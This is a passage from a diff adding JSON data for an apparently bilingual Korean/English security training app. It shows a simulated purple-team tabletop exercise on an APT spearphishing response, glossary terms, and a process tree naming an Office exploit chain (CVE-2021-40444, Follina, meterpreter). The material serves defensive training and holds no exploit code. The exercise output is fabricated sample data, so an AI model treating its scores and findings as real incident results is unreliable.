+          { "log": "Estimated response time: 4-6 hours (vs current 12+ hours)", "desc": "💡 플레이북 적용으로 대응 시간을 12시간에서 4-6시간으로 절반 이상 단축합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "SOAR (Security Orchestration, Automation and Response)", "desc": "보안 오케스트레이션·자동화·대응 플랫폼. 반복적인 IR 작업을 자동화하고 플레이북에 따라 체계적으로 대응합니다" },
+        { "name": "ASR (Attack Surface Reduction)", "desc": "Microsoft Defender의 공격 표면 축소 규칙. Office 앱에서 자식 프로세스 생성, 매크로의 Win32 API 호출 등을 차단하는 사전 방어 기능입니다" }
+      ]
+    },
+    {
+      "cmd": "python3 tabletop.py --scenario spearphish-apt --evaluate-response",
+      "out": "[+] Tabletop Exercise: APT Spearphishing Campaign Response\n═══════════════════════════════════════════════════════\n\n[*] Scenario: Nation-state APT uses zero-day spearphishing against {companyName}\n[*] Inject timeline: 08:00 → 12:00 (4 hours simulated)\n\nINJECT 1 (08:00): \"3 employees report suspicious emails with .docx attachments\"\n  Blue Team Response: ✅ Email quarantine initiated (2 min)\n  Blue Team Response: ✅ Sender domain blocked at gateway (5 min)\n  Blue Team Response: ⚠️ Only 2 of 3 mailboxes quarantined (1 missed)\n  Score: 8/10\n\nINJECT 2 (09:00): \"EDR alerts: WINWORD.EXE → unknown DLL loaded on DESKTOP-HR03\"\n  Blue Team Response: ✅ Endpoint isolated via EDR (1 min)\n  Blue Team Response: ✅ Memory dump captured for forensics (3 min)\n  Blue Team Response: ✅ Lateral movement check initiated (5 min)\n  Score: 10/10\n\nINJECT 3 (10:00): \"SIEM: Outbound SMB to external IP from 5 endpoints\"\n  Blue Team Response: ✅ Firewall rule: block all outbound 445 (2 min)\n  Blue Team Response: ⚠️ Internal SMB relay path not checked (gap from CTI)\n  Blue Team Response: ✅ Credential rotation initiated (15 min)\n  Score: 7/10\n\nINJECT 4 (11:00): \"CEO asks: What happened? Board briefing in 1 hour.\"\n  Blue Team Response: ✅ CISO briefing template used (5 min)\n  Blue Team Response: ⚠️ Business impact assessment incomplete\n  Blue Team Response: ✅ External forensics firm engaged (10 min)\n  Score: 8/10\n\n═══════════════════════════════════════════════════════\nFINAL SCORE: 33/40 (82.5%)\n\nStrengths:\n  ✅ Fast endpoint isolation (avg 1.5 min)\n  ✅ Memory forensics capability mature\n  ✅ CISO communication template effective\n\nGaps Identified:\n  ⚠️ Mailbox quarantine process: manual search missed 1 recipient\n  ⚠️ Internal SMB relay monitoring: no east-west traffic analysis\n  ⚠️ Business impact assessment: no pre-built BIA template\n\nRecommendations:\n  1. Automate mailbox search via Exchange PowerShell + SOAR\n  2. Deploy east-west NDR (Network Detection & Response) for SMB\n  3. Create pre-built BIA templates for common incident types\n\n[+] Exercise report saved: tabletop_report_2024.pdf\n[+] Purple Team cycle complete. Next review: 90 days.",
+      "def": "[SOC Manager] Tabletop exercise complete: 82.5% score, 3 improvement areas documented for 90-day remediation plan",
+      "defAction": "Source: Purple Team tabletop exercise\nTarget: SOC response procedures\nAction: 3 remediation items assigned, 90-day follow-up scheduled, SOAR automations prioritized",
+      "desc": "테이블탑 연습으로 Blue Team의 실제 대응 능력을 평가하고, 개선점을 도출합니다.",
+      "descEn": "A tabletop exercise evaluates the Blue Team's actual response capabilities and identifies improvement areas.",
+      "stepTitle": "Blue Team 검증 - 테이블탑 연습 실행",
+      "stepTitleEn": "Blue Team Validation - Tabletop Exercise",
+      "feynman": "테이블탑 연습은 실제 시스템을 건드리지 않는 '시뮬레이션 훈련'입니다. 진행자가 '08시에 의심스러운 이메일 3건 신고', '09시에 EDR 알림' 같은 상황을 주입하면, Blue Team이 실시간으로 어떻게 대응하는지 평가합니다. 82.5% 점수를 받았고, 메일박스 격리 누락, 내부 SMB 모니터링 부재, 비즈니스 영향 평가 부족 3가지 개선점을 발견했습니다.",
+      "feynmanEn": "A tabletop exercise is a 'simulation drill' without touching real systems. The facilitator injects scenarios like '3 suspicious emails reported at 08:00' and 'EDR alert at 09:00,' evaluating how the Blue Team responds in real-time. They scored 82.5%, finding 3 improvement areas: missed mailbox quarantine, no internal SMB monitoring, and incomplete business impact assessment.",
+      "expert": "테이블탑 연습은 NIST SP 800-84 기반 시뮬레이션으로, 4개 인젝트를 시간순으로 주입하여 SOC의 OODA 루프(관찰→판단→결정→행동)를 평가합니다. 33/40(82.5%) 점수에서 3개 갭이 식별되었습니다: Exchange PowerShell 자동 검색 미비, 동서(east-west) 트래픽 분석 부재, BIA 템플릿 미구비. 90일 주기로 Purple Team 사이클을 반복하여 지속적 개선을 추구합니다.",
+      "expertEn": "The tabletop exercise is a NIST SP 800-84 simulation injecting 4 injects chronologically to evaluate the SOC's OODA loop (Observe→Orient→Decide→Act). 33/40 (82.5%) score identified 3 gaps: Exchange PowerShell automated search deficiency, no east-west traffic analysis, and missing BIA templates. The Purple Team cycle repeats on a 90-day cadence for continuous improvement.",
+      "defTooltip": "📊 SOC 매니저: 테이블탑 연습 완료 — 82.5% 점수, 3개 개선 항목 90일 계획에 등록",
+      "defTooltipEn": "📊 SOC Manager: Tabletop exercise complete — 82.5% score, 3 improvements logged in 90-day plan",
+      "hackerLog": {
+        "title": "tabletop_results.log",
+        "lines": [
+          { "log": "INJECT 1: ⚠️ Only 2 of 3 mailboxes quarantined (1 missed)", "desc": "💡 수동 메일박스 검색의 한계 — SOAR 자동화로 해결해야 합니다" },
+          { "log": "INJECT 3: ⚠️ Internal SMB relay path not checked", "desc": "💡 CTI에서 식별된 갭이 실제 대응에서도 누락 — NDR 도입이 필요합니다" },
+          { "log": "FINAL SCORE: 33/40 (82.5%)", "desc": "💡 전체 점수 82.5% — 90일 후 재평가로 개선 여부를 확인합니다" }
+        ]
+      },
+      "terms": [
+        { "name": "Tabletop Exercise (TTX)", "desc": "실제 시스템에 영향 없이 시나리오 기반으로 대응 절차를 검증하는 시뮬레이션 훈련. 인젝트(상황 주입)에 대한 팀의 의사결정과 대응 속도를 평가합니다" },
+        { "name": "NDR (Network Detection & Response)", "desc": "네트워크 트래픽을 분석하여 위협을 탐지하는 보안 솔루션. 동서(east-west) 트래픽 분석으로 내부 횡적 이동을 감지합니다" }
+      ]
+    }
+  ],
+  "processTree": [
+    { "name": "WINWORD.EXE", "depth": 0, "alert": false, "minStep": 1 },
+    { "name": "mshtml.dll (CVE-2021-40444)", "depth": 1, "alert": true, "minStep": 1 },
+    { "name": "control.exe", "depth": 2, "alert": true, "minStep": 1 },
+    { "name": "powershell.exe", "depth": 3, "alert": true, "minStep": 1 },
+    { "name": "msdt.exe (Follina)", "depth": 1, "alert": true, "minStep": 2 },
+    { "name": "sdiagnhost.exe", "depth": 2, "alert": true, "minStep": 2 },
+    { "name": "meterpreter (in-memory)", "depth": 3, "alert": true, "minStep": 2 }
+  ]
+}
